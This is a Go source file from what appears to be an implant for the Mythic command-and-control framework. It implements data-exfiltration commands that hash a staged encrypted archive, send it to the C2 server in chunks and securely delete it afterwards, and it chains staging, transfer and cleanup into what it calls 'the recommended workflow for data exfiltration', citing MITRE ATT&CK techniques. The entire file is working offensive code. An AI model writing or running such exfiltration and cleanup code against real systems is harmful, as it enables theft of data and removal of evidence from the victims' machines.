package commands

import (
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"time"

	"fawkes/pkg/structs"
)

// compressExfil transfers a staged archive to Mythic via the C2 channel with
// integrity verification and optional auto-cleanup.
// MITRE ATT&CK: T1041 (Exfiltration Over C2 Channel), T1048 (Exfiltration Over Alternative Protocol)
func compressExfil(task structs.Task, params CompressParams) structs.CommandResult {
	if params.Path == "" {
		return errorResult("Error: 'path' is required for exfil action (path to staged archive)")
	}

	archivePath, err := filepath.Abs(params.Path)
	if err != nil {
		return errorf("Error resolving path: %v", err)
	}

	info, err := os.Stat(archivePath)
	if err != nil {
		return errorf("Error accessing archive: %v", err)
	}
	if info.IsDir() {
		return errorResult("Error: path must be a file, not a directory. Use 'compress stage' first to create an encrypted archive.")
	}

	fileSize := info.Size()

	// Compute SHA-256 of the entire file for integrity verification
	file, err := os.Open(archivePath)
	if err != nil {
		return errorf("Error opening archive: %v", err)
	}

	hasher := sha256.New()
	buf := make([]byte, 512*1024) // 512KB read buffer
	for {
		if task.DidStop() {
			file.Close()
			return errorResult("Exfil cancelled during hash computation")
		}
		n, readErr := file.Read(buf)
		if n > 0 {
			hasher.Write(buf[:n])
		}
		if readErr != nil {
			break
		}
	}
	fileHash := hex.EncodeToString(hasher.Sum(nil))

	// Seek back to start for transfer
	if _, err := file.Seek(0, 0); err != nil {
		file.Close()
		return errorf("Error seeking archive: %v", err)
	}

	// Transfer to Mythic via chunked file download channel
	downloadMsg := structs.SendFileToMythicStruct{}
	downloadMsg.Task = &task
	downloadMsg.IsScreenshot = false
	downloadMsg.SendUserStatusUpdates = true
	downloadMsg.File = file
	downloadMsg.FileName = filepath.Base(archivePath)
	downloadMsg.FullPath = archivePath
	downloadMsg.FinishedTransfer = make(chan int, 2)

	task.Job.SendFileToMythic <- downloadMsg

	// Wait for transfer completion
	for {
		select {
		case <-downloadMsg.FinishedTransfer:
			file.Close()

			// Auto-cleanup if requested
			cleanedUp := false
			if params.Cleanup {
				secureRemove(archivePath)
				cleanedUp = true
			}

			// Build exfil metadata
			metadata := exfilMetadata{
				ArchivePath: archivePath,
				FileSize:    fileSize,
				SHA256:      fileHash,
				CleanedUp:   cleanedUp,
				Status:      "transferred",
			}
			metadataJSON, _ := json.Marshal(metadata)
			return structs.CommandResult{
				Output:    string(metadataJSON),
				Status:    "success",
				Completed: true,
			}
		case <-time.After(1 * time.Second):
			if task.DidStop() {
				file.Close()
				return errorResult("Exfil cancelled during transfer")
			}
		}
	}
}

// exfilMetadata holds the result of an exfiltration operation.
type exfilMetadata struct {
	ArchivePath string `json:"archive_path"`
	FileSize    int64  `json:"file_size"`
	SHA256      string `json:"sha256"`
	CleanedUp   bool   `json:"cleaned_up"`
	Status      string `json:"status"`
}

// compressStageExfil is a combined stage + exfil operation: collect files into
// an encrypted archive, transfer to Mythic, and optionally clean up.
// This is the recommended workflow for data exfiltration.
func compressStageExfil(task structs.Task, params CompressParams) structs.CommandResult {
	// Step 1: Stage the archive
	stageResult := compressStage(task, params)
	if stageResult.Status != "success" {
		return stageResult
	}

	// Step 2: Parse staging metadata to get archive path
	var staged stageMetadata
	if err := json.Unmarshal([]byte(stageResult.Output), &staged); err != nil {
		return errorf("Error parsing stage metadata: %v", err)
	}

	// Step 3: Exfil the staged archive
	exfilParams := CompressParams{
		Action:  "exfil",
		Path:    staged.ArchivePath,
		Cleanup: true, // Always clean up in combined mode
	}
	exfilResult := compressExfil(task, exfilParams)
	if exfilResult.Status != "success" {
		return exfilResult
	}

	// Step 4: Build combined metadata
	var exfil exfilMetadata
	if err := json.Unmarshal([]byte(exfilResult.Output), &exfil); err != nil {
		return errorf("Error parsing exfil metadata: %v", err)
	}

	combined := stageExfilMetadata{
		StagingDir:    staged.StagingDir,
		EncryptionKey: staged.EncryptionKey,
		OriginalSize:  staged.OriginalSize,
		ArchiveSize:   staged.ArchiveSize,
		FileCount:     staged.FileCount,
		SourceSHA256:  staged.SHA256,
		ArchiveSHA256: exfil.SHA256,
		SourcePath:    staged.SourcePath,
		CleanedUp:     exfil.CleanedUp,
		Status:        "staged_and_transferred",
	}
	combinedJSON, _ := json.Marshal(combined)

	return structs.CommandResult{
		Output:    string(combinedJSON),
		Status:    "success",
		Completed: true,
	}
}

// stageExfilMetadata holds the combined result of stage + exfil.
type stageExfilMetadata struct {
	StagingDir    string `json:"staging_dir"`
	EncryptionKey string `json:"encryption_key"`
	OriginalSize  int64  `json:"original_size"`
	ArchiveSize   int64  `json:"archive_size"`
	FileCount     int    `json:"file_count"`
	SourceSHA256  string `json:"source_sha256"`
	ArchiveSHA256 string `json:"archive_sha256"`
	SourcePath    string `json:"source_path"`
	CleanedUp     bool   `json:"cleaned_up"`
	Status        string `json:"status"`
}

// formatExfilSize returns a human-readable size with transfer context.
func formatExfilSize(bytes int64) string {
	return fmt.Sprintf("%s (%d bytes)", formatFileSize(bytes), bytes)
}
